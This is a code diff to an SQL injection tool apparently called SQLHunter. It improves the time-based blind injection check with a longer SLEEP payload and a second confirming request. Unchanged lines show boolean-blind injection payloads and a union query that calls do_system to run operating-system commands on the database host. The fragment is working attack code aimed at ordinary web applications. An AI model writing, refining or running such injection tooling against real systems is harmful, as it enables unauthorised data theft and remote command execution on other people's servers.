@@ -294,17 +294,26 @@ class SQLHunter:
         if res: return res
         return self.union_query(f"SELECT do_system('{cmd}')")
 
-    # ---------- BLIND EXTRACTION (BINARY SEARCH) ----------
+    # ---------- BLIND EXTRACTION (IMPROVED TIME-BASED) ----------
     def _blind_bool_true(self, condition):
         pl = f" AND ({condition})-- -"
         resp = self._send(pl, use_tamper=False)
         return resp and len(resp.text) == self.base_len
 
     def _blind_time_true(self, condition):
-        pl = f" AND IF(({condition}), SLEEP(2), 0)-- -"
+        """Time-based check with double verification and SLEEP(3)."""
+        pl = f" AND IF(({condition}), SLEEP(3), 0)-- -"
         start = time.time()
         self._send(pl, use_tamper=False)
-        return (time.time() - start) > (self.baseline_time + 1.5)
+        elapsed1 = time.time() - start
+
+        if elapsed1 > (self.baseline_time + 2.0):
+            time.sleep(0.5)
+            start = time.time()
+            self._send(pl, use_tamper=False)
+            elapsed2 = time.time() - start
+            return elapsed2 > (self.baseline_time + 2.0)
+        return False
 
     def blind_extract_string(self, query, technique="boolean", max_len=50):
         """Extract string using blind technique with binary search for length."""
